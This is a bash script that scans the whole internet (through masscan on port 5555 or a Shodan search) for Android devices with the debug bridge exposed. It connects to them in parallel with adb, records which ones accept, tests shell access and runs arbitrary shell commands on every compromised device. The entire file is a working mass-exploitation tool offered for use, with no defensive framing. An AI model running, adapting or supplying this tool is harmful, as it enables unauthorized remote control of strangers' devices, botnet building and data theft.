#!/bin/bash

if [ $# -lt 1 ]; then
    echo "Usage: $0 --install"
    echo "Usage: $0 --shodan <directory_name> <max_parallel_jobs>"
    echo "Usage: $0 --masscan <directory_name> <max_parallel_jobs>"
    echo "Usage: $0 --pipe shell id"
    echo "Usage: cat file | $0 --connect <max_parallel_jobs>"
    echo "using: $0 --test id "
    exit 1
fi


if [ "$1" == "--install" ]; then
  # Install necessary packages
  sudo apt-get update
  sudo apt-get install -y libpcap0.8 libpcap0.8-dev libpcap-dev parallel masscan nmap nload adb

  # Install Python package
  pip install shodan

elif [ "$1" == "--shodan" ]; then
  # Check that the required arguments are provided
  if [ $# -lt 3 ]; then
      echo "Usage: $0 <directory_name> <max_parallel_jobs>"
      exit 1
  fi

  # Check if the specified directory already exists
  if [ -d "$2" ]; then
      echo "Error: Directory $2 already exists. Please choose a different directory name."
      exit 1
  fi

  # Create the directory and move into it
  mkdir -p "$2" && cd "$2" || { echo "Error: Failed to create directory $2"; exit 1; }

  # Check if Shodan is installed
  if ! command -v shodan &> /dev/null; then
      echo "Error: Shodan is not installed. Please install it and try again."
      exit 1
  fi

  # Run the Shodan search and store the results in a file
  shodan search --fields ip_str,port "Android Debug Bridge" > "$2_shodan.txt" || { echo "Error: Failed to run Shodan search"; exit 1; }

  # Process the Shodan results and extract the IP addresses
  awk '{print $1 ":" $2}' "$2_shodan.txt" | head -n 100 > "$2_ips_only.txt" || { echo "Error: Failed to process Shodan results"; exit 1; }

  # Connect to the devices in parallel using adb
  cat "$2_ips_only.txt" | parallel -j "$3" timeout 10 adb connect {} || { echo "Error: Failed to connect to devices"; }

  # Get the list of connected devices and store it in a file
  adb devices | awk '/device$/ {print $1}' > "$2_working.txt" || { echo "Error: Failed to get list of connected devices"; }

  # Disconnect from the devices
  adb disconnect

  echo "Done."

elif [ "$1" == "--masscan" ]; then
  if [ -z "$2" ]; then
    echo "Usage: $0 directory_name"
    exit 1
  fi

  if [ -d "$2" ]; then
      echo "$2 already exists. Please choose a different directory name."
      exit 1
  fi

  mkdir "$2" && cd "$2" || { echo "Failed to create directory $2"; exit 1; }


  # Check if masscan is installed
  if ! command -v masscan &> /dev/null
  then
      echo "masscan could not be found. Aborting."
     exit 1
  fi

  # Run masscan
  sudo masscan -p 5555 0.0.0.0/0 --exclude 255.255.255.255 --rate=10000 -oX "$2_masscan.xml" || { echo "Failed to run masscan"; exit 1; }

  # Extract IP addresses from masscan output
  cut -d '"' -f 4 "$2_masscan.xml" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $1 ":5555"}' > "$2_ips_only.txt" || { echo "Failed to  extract IP addresses"; exit 1; }

  # Connect to devices in parallel
  cat "$2_ips_only.txt" | parallel -j $3 timeout 10 adb connect {} | tee "$2_connect_output.txt" || { echo "Failed to connect to devices"; exit 1; }

  # Get list of connected devices
  adb devices | grep device | grep -v devices | awk '{print $1}' > "$2_working.txt" || { echo "Failed to get list of connected devices"; exit 1; }

  # Save output of connection attempts
  cat "$2_connect_output.txt" | grep connected > "$2_working_tee.txt"

  adb disconnect

  echo "Done."

elif [ "$1" == "--pipe" ]; then
  if [ $# -lt 3 ]; then
    echo "Usage: $0 --pipe shell id>"
    exit 1
  fi
  adb devices | grep device | grep -v devices |cut -f 1| parallel -j 2 adb -s {} $2 $3

elif [ "$1" == "--connect" ]; then
  if [ $# -lt 2 ]; then
    echo "Usage: cat file | $0 --connect <max_parallel_jobs>"
    exit 1
  fi
  parallel -j $2 timeout 10 adb connect {}

elif [ "$1" == "--test" ]; then

  if [ -z "$2" ]; then
      echo "Usage: $0 --test file"
      exit 1
  fi

  devices=$(adb devices | grep device | grep -v devices | cut -f 1)

  if [ -z "$devices" ]; then
      echo "No device is connected. Please connect a device first."
      exit 1
  fi

  for device in $devices; do
      if timeout 5 adb -s $device shell id > /dev/null 2>&1; then
          echo "Command executed successfully on device $device."
          echo $device >> $2
      else
          echo "Failed to execute command on device $device."
      fi
  done

else
  echo "Invalid Input : $1"
  echo "Usage: $0 --install"
  echo "Usage: $0 --shodan <directory_name> <max_parallel_jobs>"
  echo "Usage: $0 --masscan <directory_name> <max_parallel_jobs>"
  echo "Usage: $0 --pipe shell id"
  echo "Usage: cat file | $0 --connect <max_parallel_jobs>"
  echo "using: $0 --test id "
  exit 1
fi
